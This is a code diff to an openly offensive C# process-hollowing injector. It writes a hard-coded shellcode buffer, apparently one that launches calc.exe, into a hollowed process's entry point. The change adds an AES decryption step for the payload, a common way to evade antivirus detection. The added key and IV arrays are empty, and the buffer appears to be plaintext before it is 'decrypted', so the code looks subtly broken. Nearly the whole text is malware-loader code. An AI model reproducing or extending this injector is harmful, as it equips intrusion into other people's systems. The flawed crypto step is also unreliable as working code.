@@ -4,6 +4,8 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.IO;
 
 namespace CSProcessHollowing
 {
@@ -106,6 +108,25 @@ namespace CSProcessHollowing
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern uint ResumeThread(IntPtr hThread);
 
+        static byte[] Decrypt(byte[] encData)
+        {
+            Aes aes = Aes.Create();
+            aes.KeySize = 128;
+            aes.BlockSize = 128;
+            aes.Key = new byte[16] {  }; 
+            aes.IV = new byte[16] {  };
+            aes.Padding = PaddingMode.Zeros;
+            ICryptoTransform cryptoTransform = aes.CreateDecryptor(aes.Key, aes.IV);
+            MemoryStream ms = new MemoryStream();
+            CryptoStream cs = new CryptoStream( ms, cryptoTransform, CryptoStreamMode.Write );
+            cs.Write(encData, 0, encData.Length);
+            cs.FlushFinalBlock();
+
+            byte[] data = ms.ToArray();
+
+            return data;
+        }
+
         static void Main(string[] args)
         {
 
@@ -160,6 +181,7 @@ namespace CSProcessHollowing
             IntPtr entryPointAddr = (IntPtr)(entrypoint_rva + (UInt64)imgBase);
             Console.WriteLine($"Address of entrypoint: {"0x" + entryPointAddr.ToString("x")}");
 
+
             byte[] buf = new byte[276] {
             0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
             0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
@@ -181,6 +203,9 @@ namespace CSProcessHollowing
             0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
             0x63,0x2e,0x65,0x78,0x65,0x00 };
 
+
+            Console.WriteLine("Decrypting");
+            buf = Decrypt(buf);
 
             WriteProcessMemory(hProcess, entryPointAddr, buf, buf.Length, out nRead);
 
